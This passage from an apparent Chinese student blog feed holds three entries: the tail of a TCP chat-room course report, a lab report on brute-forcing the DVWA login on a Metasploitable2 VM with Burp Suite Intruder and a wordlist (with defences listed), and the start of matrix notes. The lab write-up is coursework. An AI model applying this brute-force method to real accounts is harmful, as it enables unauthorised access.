src="/2024/06/22/%E8%AE%A1%E7%BD%91%E8%AF%BE%E8%AE%BE%EF%BC%9A%E5%9F%BA%E4%BA%8ETCP%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%AE%80%E5%8E%86%E8%81%8A%E5%A4%A9%E5%AE%A4%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image_1_5LzhEutMu5.jpeg"></p><center>图3.3  在线聊天室注册界面</center><p>输入用户名和密码，点击“注册”，之后系统会提示是否注册成功，注册成功后可以在登录界面输入刚才注册的用户名和密码进行登录。如图3.4所示，当用户名和密码正确时，会提示登录成功。</p><p><img src="/2024/06/22/%E8%AE%A1%E7%BD%91%E8%AF%BE%E8%AE%BE%EF%BC%9A%E5%9F%BA%E4%BA%8ETCP%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%AE%80%E5%8E%86%E8%81%8A%E5%A4%A9%E5%AE%A4%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image_2_QjXYngnVRB.jpeg"></p><center>图3.4  登录成功</center><p>登录成功之后会进入到聊天界面，此时用户可以选择和其他用户进行群聊或私聊，如图3.5所示。</p><p><img src="/2024/06/22/%E8%AE%A1%E7%BD%91%E8%AF%BE%E8%AE%BE%EF%BC%9A%E5%9F%BA%E4%BA%8ETCP%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%AE%80%E5%8E%86%E8%81%8A%E5%A4%A9%E5%AE%A4%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image_wwhBQAiKp5.png"></p><center>图3.5  1个用户的客户端界面</center><p>同时，从图3.5可以看到当前用户为202113115，并且此时只有一个用户。这里再注册一个用户进行测试，同样登录进入到聊天界面如图3.6所示。此时由于用户202113115在线，所以在用户1的其他在线用户中会显示用户202113115的存在。同样在用户202113115的其他用户列表中也会显示用户1在线。</p><p><img src="/2024/06/22/%E8%AE%A1%E7%BD%91%E8%AF%BE%E8%AE%BE%EF%BC%9A%E5%9F%BA%E4%BA%8ETCP%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%AE%80%E5%8E%86%E8%81%8A%E5%A4%A9%E5%AE%A4%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image_1_HggVJWwZlM.png"></p><center>图3.6  2个用户的客户端界面</center><p>查看数据库中是否有对应的用户名和密码，如图3.7所示，发现此时MySQL数据库中存在已经两个用户注册的用户名和密码，说明程序对数据库的操作正确。</p><p><img src="/2024/06/22/%E8%AE%A1%E7%BD%91%E8%AF%BE%E8%AE%BE%EF%BC%9A%E5%9F%BA%E4%BA%8ETCP%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%AE%80%E5%8E%86%E8%81%8A%E5%A4%A9%E5%AE%A4%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image_2_8vJFCQadVH.png"></p><center>图3.7  数据库中存储的数据</center><h2 id="8-2-客户端群聊功能演示"><a href="#8-2-客户端群聊功能演示" class="headerlink" title="8.2 客户端群聊功能演示"></a>8.2 客户端群聊功能演示</h2><p>客户端群聊功能是一个典型的网络应用场景，通常涉及多个用户通过网络连接在同一个聊天室或频道中进行即时通讯。当用户1在群聊窗口中发送一个消息时，其他所有用户都能够收到这条消息，演示结果如图3.8所示。</p><p><img src="/2024/06/22/%E8%AE%A1%E7%BD%91%E8%AF%BE%E8%AE%BE%EF%BC%9A%E5%9F%BA%E4%BA%8ETCP%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%AE%80%E5%8E%86%E8%81%8A%E5%A4%A9%E5%AE%A4%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image_3_bZv9_rg4wf.png"></p><center>图3.8  群聊功能</center><h2 id="8-3-客户端私聊功能演示"><a href="#8-3-客户端私聊功能演示" class="headerlink" title="8.3 客户端私聊功能演示"></a>8.3 客户端私聊功能演示</h2><p>客户端私聊功能与群聊功能有所不同，因为它需要指定接收者，而不是简单地将消息广播给所有连接的客户端，所以私聊功能需要进行额外的设计，同时私聊时应当单独打开一个聊天窗口，而不应该在群聊窗口中进行显示，。</p><p>用户1可以在左侧的其他在线用户列表中选择要进行私聊的用户，这里选择用户202113115，之后点击左侧“选定用户私聊”的按钮，即可开启一个和用户202113115私聊的窗口。此时，用户1和用户202113115的聊天内容除了他们其他人室看不见的，演示结果如图3.9所示。</p><p><img src="/2024/06/22/%E8%AE%A1%E7%BD%91%E8%AF%BE%E8%AE%BE%EF%BC%9A%E5%9F%BA%E4%BA%8ETCP%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%AE%80%E5%8E%86%E8%81%8A%E5%A4%A9%E5%AE%A4%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image_4_dSeYFyi0SF.png"></p><center>图3.9  私聊功能</center><h2 id="8-4-服务器消息日志功能演示"><a href="#8-4-服务器消息日志功能演示" class="headerlink" title="8.4 服务器消息日志功能演示"></a>8.4 服务器消息日志功能演示</h2><p>由图3.10可以看到，服务器的界面有查看用户消息日志、查看在线用户、对指定的用户强制下线、禁言和解除禁言的功能。通过这些功能可以了解系统负载和活跃度，同时在发现恶意行为、违反规定或其他紧急情况下，管理员可以立即将用户强制下线或进行禁言，有助于维护在线聊天室的秩序和安全，提升了管理员对系统运行状态和用户活动的可视化和控制能力。</p><p>经过前面演示操作后的消息日志如图3.10所示，可以看到在服务器端能够看到所有用户的行为，例如所有用户的登录和注册。</p><p><img src="/2024/06/22/%E8%AE%A1%E7%BD%91%E8%AF%BE%E8%AE%BE%EF%BC%9A%E5%9F%BA%E4%BA%8ETCP%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%AE%80%E5%8E%86%E8%81%8A%E5%A4%A9%E5%AE%A4%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image_5_N3nYDwHGlm.png"></p><center>图3.10  服务器界面</center><h2 id="8-5-服务器禁言功能演示"><a href="#8-5-服务器禁言功能演示" class="headerlink" title="8.5 服务器禁言功能演示"></a>8.5 服务器禁言功能演示</h2><p>在服务器端可以对右侧在线用户中指定的用户进行禁言功能，防止有些用户发表不正当言论等行为，具体操作是点击一个用户后，点击底部中间的“禁言”按钮，结果如图3.11所示。</p><p><img src="/2024/06/22/%E8%AE%A1%E7%BD%91%E8%AF%BE%E8%AE%BE%EF%BC%9A%E5%9F%BA%E4%BA%8ETCP%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%AE%80%E5%8E%86%E8%81%8A%E5%A4%A9%E5%AE%A4%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image_6_k5QlFe-IAA.png"></p><center>图3.11  服务器禁言功能</center><p>之后会提示已将用户1禁言，用户1将无法在聊天室中发送任何消息。发送消息按钮变为灰色以及不可点击状态，以示禁言状态。同时，管理员禁言后，用户1也将无法发起或回复任何私聊会话。私聊按钮也会被禁用，以防止用户1绕过禁言限制。</p><p>用户1禁言后的效果如图3.12所示。</p><p><img src="/2024/06/22/%E8%AE%A1%E7%BD%91%E8%AF%BE%E8%AE%BE%EF%BC%9A%E5%9F%BA%E4%BA%8ETCP%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%AE%80%E5%8E%86%E8%81%8A%E5%A4%A9%E5%AE%A4%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image_7_8uP7FL3T-I.png"></p><center>图3.12  用户1被禁言时的客户端</center><h2 id="8-6-服务器解除禁言功能演示"><a href="#8-6-服务器解除禁言功能演示" class="headerlink" title="8.6 服务器解除禁言功能演示"></a>8.6 服务器解除禁言功能演示</h2><p>将用户禁言一段时间后，可以对用户解除禁言。通过点击“解除禁言”按钮实现，解除禁言后用户可以正常发送消息以及和其他用户进行私聊。</p><p><img src="/2024/06/22/%E8%AE%A1%E7%BD%91%E8%AF%BE%E8%AE%BE%EF%BC%9A%E5%9F%BA%E4%BA%8ETCP%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%AE%80%E5%8E%86%E8%81%8A%E5%A4%A9%E5%AE%A4%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image_8_RusLszb8WP.png"></p><center>图3.13  服务器解除禁言功能</center><h2 id="8-7-服务器强制下线功能演示"><a href="#8-7-服务器强制下线功能演示" class="headerlink" title="8.7 服务器强制下线功能演示"></a>8.7 服务器强制下线功能演示</h2><p>在服务器端可以对指定的用户进行强制下线的操作，即选定一个用户后，点击底部左侧的“强制下线”按钮，即可将对应的用户强制下线。被强制下线的用户的所在的客户端会弹出图3.14所示的下线提示窗口。</p><p><img src="/2024/06/22/%E8%AE%A1%E7%BD%91%E8%AF%BE%E8%AE%BE%EF%BC%9A%E5%9F%BA%E4%BA%8ETCP%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%AE%80%E5%8E%86%E8%81%8A%E5%A4%A9%E5%AE%A4%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image_9_tNWlxuaFds.png"></p><center>图3.14  服务器强制下线功能</center><p>经过上述操作后，查看服务器端的日志文件如图3.15所示。</p><p><img src="/2024/06/22/%E8%AE%A1%E7%BD%91%E8%AF%BE%E8%AE%BE%EF%BC%9A%E5%9F%BA%E4%BA%8ETCP%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%AE%80%E5%8E%86%E8%81%8A%E5%A4%A9%E5%AE%A4%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image_10_do1fRPYcuN.png"></p><center>图3.15  服务器消息日志</center><hr><h1 id="9-结束语"><a href="#9-结束语" class="headerlink" title="9 结束语"></a>9 结束语</h1><p>本次计算机网络课程设计应该是本科阶段的最后一个课程设计，通过计算机科学与技术专业的这么多次课程设计，感觉自己的代码能力和工程能力有了很大的提升。在此次设计一个基于TCP协议的简易聊天室程序时，我从中收获了许多宝贵的计算机网络知识和实践经验，其中最主要的是深刻理解了书本上所学的TCP协议和C&#x2F;S架构。</p><p>在日常生活中，可靠的消息通信是非常重要的，如果人们之间传送的消息如果出现了丢失和差错，将会导致不可挽回的后果。通过实现聊天室程序，我深入理解了TCP协议的可靠性、流量控制和拥塞控制机制。理解TCP连接的建立、数据传输和断开过程对于两个源点之间的可靠通信至关重要。并且我学会了如何使用Socket API来实现基于TCP的通信。这不仅仅是理论知识，还涉及到实际的编码和调试过程，帮助我熟悉了如何在实际项目中应用所学的网络概念。</p><p>此外，实现一个聊天室需要处理多个客户端同时连接的情况，我通过使用并发编程来有效地管理多个线程或进程来处理这些连接。在开发过程中，我遇到了各种各样的错误和异常情况，例如客户端与服务器连接不上、服务器连接数据库失败以及服务器对收到的信息解析错误等。通过解决这些问题，我提升了自己的错误处理能力和调试技能，学会了如何有效地排查和修复网络程序中的问题。</p><p>计算机专业的理论知识学习固然重要，但仅仅停留在理论层面是远远不够的。只有将理论知识应用到实际项目中，才能真正理解它们的意义和实际效果。只有实际实现一个聊天室，才能体会到TCP如何在实际通信中处理数据包的传输和重传，以及如何通过Socket进行通信。在今后的学习和职业生涯中，这种实践经验将为我提供宝贵的基础和信心，使我能够更好地应对复杂的技术挑战和项目需求。</p><hr><h1 id="10-参考资料"><a href="#10-参考资料" class="headerlink" title="10 参考资料"></a>10 参考资料</h1><ol><li>王罡, 林立志. 基于Windows的TCP&#x2F;IP编程[M]. 北京, 清华大学出版社, 2002.</li><li>李向江, 赵怡涛, 马雪凝. 基于Socket接口的局域网聊天系统设计[J]. 长江信息通信, 2024,37(04):109-111.</li><li>张玉, 贾遂民, 郑桂萍. 基于Socket的网络聊天系统的设计与实现[J]. 计算机时代, 2022,(12): 93-95.</li><li>甄泰航. 基于Socket通信的社交应用软件[J]. 电子技术与软件工程, 2020, (16): 30-33.</li><li>谢希仁. 计算机网络（第8版）[M]. 北京, 电子工业出版社, 2021.</li></ol>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全实验3：密码爆破</title>
      <link href="/2024/06/22/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"/>
      <url>/2024/06/22/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="1-实验环境"><a href="#1-实验环境" class="headerlink" title="1 实验环境"></a>1 实验环境</h1><ol><li>操作系统版本：Windows 11 家庭中文版23H2</li><li>VMware® Workstation 16 Pro：16.2.3 build-19376536</li><li>Metasploitable2虚拟机版本：2.6.24-16-server</li><li>Kali虚拟机版本：6.6.9-amd64</li></ol><hr><h1 id="2-实验内容"><a href="#2-实验内容" class="headerlink" title="2 实验内容"></a>2 实验内容</h1><p>Metasploitable2是一个特意设计用来进行渗透测试和漏洞分析的虚拟机。它基于Ubuntu Linux操作系统，包含了大量的已知漏洞，以便安全专业人员和研究人员可以使用渗透测试工具，如Metasploit等，来测试和验证其安全性。</p><p>Kali Linux是一种基于Debian Linux的渗透测试和网络安全分析的专用发行版。它旨在为安全专业人员、渗透测试人员和网络管理员提供一个功能强大的平台，用于评估系统和网络的安全性，并测试安全防御的有效性。Kali Linux包含了大量的渗透测试工具和网络安全工具，包括Metasploit框架、Nmap、Wireshark、Aircrack-ng等。这些工具涵盖了从信息收集、漏洞分析到渗透测试和数据包嗅探等多个方面，使用户能够全面地评估和测试目标系统的安全性。本次实验在这两个虚拟机上进行。</p><h2 id="2-1-登录Metasploitable2，设置安全级别"><a href="#2-1-登录Metasploitable2，设置安全级别" class="headerlink" title="2.1 登录Metasploitable2，设置安全级别"></a>2.1 登录Metasploitable2，设置安全级别</h2><p>在Metasploitable2虚拟机中输入用户名和密码进行登录，之后输入“ifconfig”命令查看本虚拟机的IP地址。</p><p><img src="/2024/06/22/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/image_yTq-zx42H6.png"></p><p>图2.1  查看Metasploitable2虚拟机IP地址</p><p>如图2.1所示，虚拟机的IP地址是192.168.77.132，之后启动Kali虚拟机，并打开火狐浏览器，访问网址192.168.77.132，如图2.2所示，访问成功。</p><p><img src="/2024/06/22/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/image_1_JsZUX2VQI7.png"></p><p>图2.2  Kali虚拟机中访问Metasploitable2服务器</p><p>点击进入DVWA服务，设置网站的密码强度，这里设置密码强度为“low”，并点击点击“submit”进行提交，在后面还对密码强度为“high”进行测试。</p><p><img src="/2024/06/22/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/image_2_Z5E3JT7P5-.png"></p><p>图2.3  设置密码安全性</p><p>对Kali虚拟机的浏览器设置代理，设置代理服务器通常需要指定代理服务器的地址和端口号，浏览器会将所有的网络请求发送到代理服务器，然后由代理服务器来转发请求和接收响应。如图2.4所示，浏览器将向地址为192.168.77.132发送的所有网络请求转发到127.0.0.1地址的80端口。</p><p><img src="/2024/06/22/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/image_3_6EdCNTKwbv.png"></p><p>图2.4  对浏览器设置HTTP代理</p><p>之后打开Kali虚拟机的Burpsuite面板，设置监听端口为127.0.0.1:80，界面如图2.5所示，之后开启Burpsuite拦截。</p><p><img src="/2024/06/22/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/image_4_21WTALvIvD.png"></p><p>图2.5  设置监听地址</p><p>开启拦截之后，返回浏览器，在Brute Force中输入一个用户名和密码，并点击登录。</p><p><img src="/2024/06/22/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/image_5_Ijvo0f6NLs.png"></p><p>图2.6  输入用户名和密码进行登录</p><p>点击登录之后，Burpsuite工具就可以在后台捕获到用户输入的用户名和密码，如下图2.7所示。</p><p><img src="/2024/06/22/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/image_6_UMCMNddV0v.png"></p><p>图2.7  Burpsuite捕获到的内容</p><p>选择这段捕获的内容，右键点击“send to intruder”，可以将选定的HTTP请求发送到Burp Suite的Intruder工具中。</p><p>Burp Suite的Intruder工具是一种非常强大的功能，它可以自动化地对目标进行定制的攻击，比如暴力破解、参数枚举、字典攻击等。发送请求到Intruder之后，用户可以配置不同的攻击参数，比如负载、位置标记等，然后启动攻击并查看攻击结果。之后标记要破解的内容，即用户名和密码。如图2.8所示。</p><p><img src="/2024/06/22/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/image_7_Jb-rUx0r0n.png"></p><p>图2.8  标记要破解的内容</p><p>在后面的攻击中，会使用到Payloads工具。Payloads是在渗透测试或攻击中发送到目标系统的恶意或特定目的的数据。Payloads的作用是利用目标系统的漏洞或弱点，以实现攻击者的目标，比如获取敏感信息、执行代码、拒绝服务等。</p><p>打开“Payloads”标签，设置两个Payloads，如图2.9所示：</p><p><img src="/2024/06/22/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/image_8_TJrhicw9U3.png"></p><p>图2.9  设置Payloads set1</p><p>在Burp Suite的Intruder工具中，可以设置Payloads为字典类型，用于进行字典攻击。字典攻击是一种常见的密码破解技术，通过尝试大量的可能性，从预先准备好的字典文件中逐个测试密码，直到找到正确的密码为止。如图2.9所示，在Payload set2中导入kali已经存在的字典文件。</p><p><img src="/2024/06/22/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/image_9_BrPnlDinuy.png"></p><p>图2.10  设置Payloads set2</p><p>在配置完Payloads、设置好攻击目标后，点击“Start Attack”按钮，Burp Suite Intruder将会开始发送预设的攻击请求到目标系统，并根据配置的Payloads对每个请求进行定制化攻击，并开始尝试不同的Payloads以便发现漏洞或弱点。如图2.11所示，一旦攻击开始，用户可以实时地监视攻击进度并查看攻击结果。</p><p><img src="/2024/06/22/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/image_10_P5blafms3K.png"></p><p>图2.11  攻击得到的结果</p><p>可以发现在所有分析结果中，只有23这条数据的长度与其他不同，这里长度的概念需要明确，指的是当我们以每条数据所示的用户名和密码去网站进行登录测试时，系统返回的数据包的长度。由此可以推测，当密码错误时，可能返回的长度是一种，当用户名和密码正确时，系统返回的数据包长度肯定是另一种，所以推测23条所示的用户名和密码很有可能是正确的。</p><p>接下来使用这对用户名和密码在网站中进行测试，测试结果如图2.12所示，输入用户名admin和密码password后点击“Login”，系统返回信息“Welcome to the password protected area admin”，登录成功，说明我们密码爆破成功！</p><p><img src="/2024/06/22/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/image_11_eQhOvh5x2W.png"></p><p>图2.12  测试结果</p><h2 id="2-2-设置安全级别为高，并进行密码爆破"><a href="#2-2-设置安全级别为高，并进行密码爆破" class="headerlink" title="2.2 设置安全级别为高，并进行密码爆破"></a>2.2 设置安全级别为高，并进行密码爆破</h2><p>我们将DVWA的密码强度改为“high”，并进行同样的操作进行测试，结果如图2.13所示。</p><p><img src="/2024/06/22/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/image_12_OQADQUm7UH.png"></p><p>图2.13  攻击得到的结果</p><p>密码爆破结果与安全等级为“low”没有什么区别，但是在爆破的过程中明显感觉到破解的速度变慢了，并且length字段的值也变大了。</p><h2 id="2-3-密码爆破防御方法"><a href="#2-3-密码爆破防御方法" class="headerlink" title="2.3 密码爆破防御方法"></a>2.3 密码爆破防御方法</h2><p>密码爆破是一种常见的攻击手段，用于尝试在短时间内通过不断尝试各种可能的密码组合来破解账户的登录凭据。为了防止密码爆破攻击，可以采取以下几种防御方法：</p><ol><li>强密码策略：实施强密码策略，要求用户设置复杂度高、长度足够的密码。这些密码应该包含大写字母、小写字母、数字和特殊字符，并且不容易被猜测到。</li><li>账户锁定：当用户连续多次输入错误密码时，可以暂时锁定账户，阻止进一步的登录尝试。这可以有效防止密码爆破攻击。</li><li>登录失败延迟：在每次登录失败后，增加一定的延迟时间再次尝试登录。这样可以减缓攻击者的速度，使得密码爆破攻击变得更加困难。</li><li>验证码：引入验证码机制，在用户登录时要求输入额外的验证码，只有在验证码验证通过后才能继续进行密码验证，从而有效防止自动化的密码爆破攻击。</li></ol><p>通过以上这些措施的综合应用，可以有效地提高系统对密码爆破攻击的抵御能力，保护用户账户和系统安全。</p><hr><h1 id="3-实验总结"><a href="#3-实验总结" class="headerlink" title="3 实验总结"></a>3 实验总结</h1><p>在进行了部署Metasploitable2渗透测试平台，并尝试了不同安全级别下的密码爆破攻击后，我对密码爆破防御方法有了更深入的认识。</p><p>总结实验1和2的结果，我认识到密码爆破防御是多层次、多方面的。除了密码复杂度要求外，还需要结合账户锁定、登录失败延迟、验证码、多因素认证等措施，形成一个完整的密码爆破防御体系。</p><p>通过这次实验，我对密码爆破攻击及其防御方法有了更深入的理解，并且认识到密码安全对于系统安全至关重要，需要综合考虑各种防御手段，以确保系统的安全性和稳定性。</p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线性代数第2章：矩阵及其运算</title>
      <link href="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/"/>
      <url>/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/</url>
      
        <content type="html"><![CDATA[<h1 id="1-线性方程组和矩阵"><a href="#1-线性方程组和矩阵" class="headerlink" title="1 线性方程组和矩阵"></a>1 线性方程组和矩阵</h1><h2 id="1-1-线性方程组"><a href="#1-1-线性方程组" class="headerlink" title="1.1 线性方程组"></a>1.1 线性方程组</h2><p>n个未知数m个方程的线性方程组如下：</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_1ewkxJyipz.png"></p><p>上述线性方程组的解取决于系数a和常数项b。</p><p>当常数项b&#x3D;0时，方程组</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_XLI32nJikb.png"></p><p>称为n元齐次线性方程组，当b≠0时，称为n元非齐次线性方程组。</p><p>线性方程组的系数和常数项按原位置可以排成数表如下：</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_Fh4n64o4ly.png"></p><p>对线性方程组的研究，可以转化为对此表的研究。</p><h2 id="1-2-矩阵的定义"><a href="#1-2-矩阵的定义" class="headerlink" title="1.2 矩阵的定义"></a>1.2 矩阵的定义</h2><p>由$m \times n$个数$a_{ij}（i&#x3D;1,2,…,m;j&#x3D;1,2,…,n)$排成的m行n列的数表</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_PpwX3gn4cw.png"></p><p>称为m行n列的矩阵，简称$m \times n$矩阵，记作</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_eYAV4VKo92.png"></p><p>这$m \times n$个数称为矩阵A的元素，简称为<strong>元</strong>，数$a_{ij}$位于矩阵A的第ｉ行第ｊ列，$m \times n$矩阵A也可记作$A_{m \times n}$。</p><p>元素为实数的矩阵称为<strong>实矩阵</strong>；元素有虚数的矩阵称为<strong>复矩阵</strong>。</p><h3 id="1-2-1-几种特殊的矩阵"><a href="#1-2-1-几种特殊的矩阵" class="headerlink" title="1.2.1 几种特殊的矩阵"></a>1.2.1 几种特殊的矩阵</h3><p>（1）行数和列数都等于n的矩阵称为<strong>n阶矩阵</strong>或<strong>n阶方阵</strong>，n阶矩阵A也记作$A_n$。</p><p>（2）只有一行的矩阵$A&#x3D;\left(\begin{array}{llll}a_{1} &amp; a_{2} &amp; \cdots &amp; a_{n}\end{array}\right)$称为<strong>行矩阵</strong>或<strong>行向量</strong>。</p><p>（3）形如以下的矩阵称为<strong>对角矩阵</strong>（或对角阵），记作$A&#x3D;\operatorname{diag}\left(\lambda_{1}, \lambda_{2}, \cdots, \lambda_{n}\right)$。</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_LZQixO5rQK.png"></p><p>（4）对角阵中的对角线全为1时，此方阵为<strong>单位阵</strong>。</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_4rj92JoeMF.png"></p><p>（5）两矩阵的行数相等，列数也相等时，称它们是<strong>同型矩阵</strong>。若$A&#x3D;\left(a_{i j}\right)$与$B&#x3D;\left(b_{i j}\right)$是同型矩阵，且它们的对应元素相等，即$a_{i j}&#x3D;b_{i j}(i&#x3D;1,2, \cdots, m ; j&#x3D;1,2, \cdots, n)$，则称矩阵A和B<strong>相等</strong>，记作A&#x3D;B。</p><p>（6）元素都是0 的矩阵称为<strong>零矩阵</strong>，记作O。</p><blockquote><p>不同型的零矩阵不相等。</p></blockquote><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_m7eiuABxRZ.png"></p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_yz7PEIM8ly.png"></p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_W6bDBXOpnw.png"></p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_Mu-kPEml8D.png"></p><p>行列式和矩阵有本质的区别：</p><ul><li>行列式是一个算式，一个数字行列式经过计算得到一个数值，<strong>并且行列式的行数和列数一定相等</strong>；</li><li>而矩阵仅仅是一个数表，它的行数和列数可以不同。</li></ul><hr><h1 id="2-矩阵的运算"><a href="#2-矩阵的运算" class="headerlink" title="2 矩阵的运算"></a>2 矩阵的运算</h1><h2 id="2-1-矩阵的加法"><a href="#2-1-矩阵的加法" class="headerlink" title="2.1 矩阵的加法"></a>2.1 矩阵的加法</h2><p>设有两个$m \times n$矩阵$A&#x3D;\left(a_{i j}\right)$和$B&#x3D;\left(b_{i j}\right)$，则矩阵A与B的和记作A＋B，规定为：</p><p><img 